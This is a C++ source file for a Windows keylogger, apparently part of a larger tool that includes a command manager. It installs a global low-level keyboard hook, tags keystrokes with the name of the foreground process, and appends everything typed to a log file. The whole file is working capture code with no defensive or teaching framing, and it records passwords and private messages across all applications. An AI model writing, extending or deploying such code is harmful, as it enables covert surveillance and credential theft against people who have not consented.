#include "keyLogger.h"
#include "commandManager.h"
#include <Psapi.h>
#include <tchar.h>
#include <map>

keyLogger::keyLogger()
{

}

// setting virtual key
void keyLogger::initializeKeyDict()
{
	virtualKeyDict.insert({VK_SHIFT, "[SHIFT]" });
	virtualKeyDict.insert({ VK_LSHIFT,	"[LSHIFT]" });
	virtualKeyDict.insert({ VK_RSHIFT,	"[RSHIFT]" });
	virtualKeyDict.insert({ VK_CONTROL,	"[CONTROL]" });
	virtualKeyDict.insert({ VK_LCONTROL,	"[LCONTROL]" });
	virtualKeyDict.insert({ VK_RCONTROL,	"[RCONTROL]" });
	virtualKeyDict.insert({ VK_MENU,	"[ALT]" });
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_SPACE , " " });
	virtualKeyDict.insert({ VK_RETURN , "[Enter]\n" });
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_TAB , "[TAB]" });
	virtualKeyDict.insert({ VK_ESCAPE , "[ESC]" });
	virtualKeyDict.insert({ VK_DELETE , "[DELETE]" });
	virtualKeyDict.insert({ VK_PRIOR , "[PAGE UP]" });
	virtualKeyDict.insert({ VK_NEXT , "[PAGE DOWN]" });
	virtualKeyDict.insert({ VK_CAPITAL , "[CAPS LOCK]" });
	virtualKeyDict.insert({ VK_LWIN , "[LWIN]" });
	virtualKeyDict.insert({ VK_RWIN , "[RWIN]" });
	virtualKeyDict.insert({ VK_LEFT , "[<-]" });
	virtualKeyDict.insert({ VK_RIGHT , "[->]" });
	virtualKeyDict.insert({ VK_UP , "[↑]" });
	virtualKeyDict.insert({ VK_DOWN , "[↓]" });
	virtualKeyDict.insert({ VK_OEM_PERIOD , "[.]" });
	virtualKeyDict.insert({ VK_DECIMAL , "[.]" });
	virtualKeyDict.insert({ VK_OEM_PLUS , "[+]" });
	virtualKeyDict.insert({ VK_OEM_MINUS , "[-]" });
	virtualKeyDict.insert({ VK_ADD , "[+]" });
	virtualKeyDict.insert({ VK_SUBTRACT , "[-]" });
}

// make hook
void keyLogger::startHook()
{
	keyLogger::initializeKeyDict();

	HMODULE hModule = GetModuleHandle(NULL);
	keyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, hModule, NULL);

	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL);
}

// Hooking function
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((WM_KEYDOWN == wParam) || (WM_SYSKEYDOWN == wParam))
	{	
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		makeKeyLog(pKey->vkCode, 0);
	}
	/*else if ((WM_KEYUP == wParam) || (WM_SYSKEYUP == wParam))
	{
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		makeKeyLog(pKey->vkCode, 1);
	}*/

	return CallNextHookEx(keyHook, nCode, wParam, lParam);
}

/*
	키 코드에 해당하는 키 네임을 찾고 로깅
	최적화를 위해 시간 간격 혹은 횟수 간격을 둬서, 파일 스트림을 재활용하도록 변경 예정
*/
void makeKeyLog(int keyCode, int statusFlag)
{
	std::string logMessage = "";
	std::string keyName = "";
	std::string specialKeyName = "";

	HWND foregroundHandle = GetForegroundWindow();
	DWORD pid;

	if (foregroundHandle != NULL)
	{
		GetWindowThreadProcessId(foregroundHandle, &pid);

		if (pid != prevPID)
		{
			prevPID = pid;

			commandManager cm;

			std::wstring wName = cm.pidToName(pid);
			std::string name;
			name.assign(wName.begin(), wName.end());

			logMessage = "\n\n<" + name + ">\n";
		}
	}

		
	// ctrl, shift, alt의 경우 다른 키와 대부분 함께 사용되므로 GetAsyncState로 처리
	/*if (GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000 || GetAsyncKeyState(VK_CONTROL) & 0x8000) {
		specialKeyName = "[Ctrl + ";
	}
	else if (GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000) {
		specialKeyName = "[Shift + ";
	}
	else if (GetAsyncKeyState(VK_LMENU) & 0x8000 || GetAsyncKeyState(VK_RMENU) & 0x8000) {
		specialKeyName = "[Alt + ";
	}
	else {
		specialKeyName = "";
	}*/

	// 키에 해당하는 키 네임을 찾는 루틴
	if (0x00 < keyCode && (0x2F >= keyCode || keyCode >= 0x5B)) {
		for (auto virtualKey : virtualKeyDict) {
			if (keyCode == virtualKey.first) {
				keyName = virtualKey.second;
				break;
			}
		}
	}
	else
		keyName.push_back(((char)keyCode));


	if (specialKeyName == "" && keyName == "")
		std::cout << keyCode << std::endl;

	logMessage.append(specialKeyName + keyName);

	if (specialKeyName != "")
		logMessage.append("]");
	//std::cout << "Log : " << logMessage << std::endl;

	std::ofstream writeStream;

	writeStream.open(savePath, std::ios_base::app);

	writeStream << logMessage;

	writeStream.close();
}